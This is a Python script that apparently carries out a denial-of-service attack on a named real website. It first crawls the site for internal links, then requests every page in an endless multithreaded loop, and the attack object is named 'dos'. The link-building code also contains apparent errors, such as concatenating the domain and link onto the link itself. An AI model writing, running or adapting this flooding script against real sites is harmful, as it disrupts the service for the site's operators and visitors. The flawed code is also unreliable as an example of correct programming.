import re
import time

from packets.TheMiner import TheMiner
from packets.websiteds import Website
from bs4 import BeautifulSoup
import concurrent.futures
from packets.global_vars import visited

class Bombardment:
    def __init__(self, website):
        self.website = website
        # self.visited = []
        self.listings = []

    def link_maker(self, link):
        if re.search(r'http\.*', link):
            # Complete link
            if self.website.domain in link:
                # Internal
                return link
            else:
                return None
        else:
            link += self.website.domain + link
            return link

    def gathrer(self, url):
        soup = TheMiner.fetch_page(url, ghost=True)
        if soup is not None:
            links = soup.find_all('a')
            for i in links:
                link = i.get('href')
                if link is not None:
                    link = self.link_maker(link)
                    if link not in self.listings:
                        self.listings.append(link)

    def hunter(self, url):
        soup = TheMiner.fetch_page(url, ghost=True)

    def bomber(self):
        while True:
            visited.clear()
            with concurrent.futures.ThreadPoolExecutor() as executor:
                results = executor.map(self.hunter, self.listings)

            for result in results:
                pass

    def collector(self):
        for _ in range(10):
            with concurrent.futures.ThreadPoolExecutor() as executor:
                results = executor.map(self.gathrer, self.listings)
            for result in results:
                pass

    def go(self):
        self.gathrer(self.website.start_url)
        self.collector()
        print(len(self.listings))
        time.sleep(5)
        self.bomber()


def main():
    target = Website("https://www.increaseimmunity.org", "https://www.increaseimmunity.org/", 'ARTSY')
    dos = Bombardment(target)
    dos.go()

if __name__ == "__main__":
    main()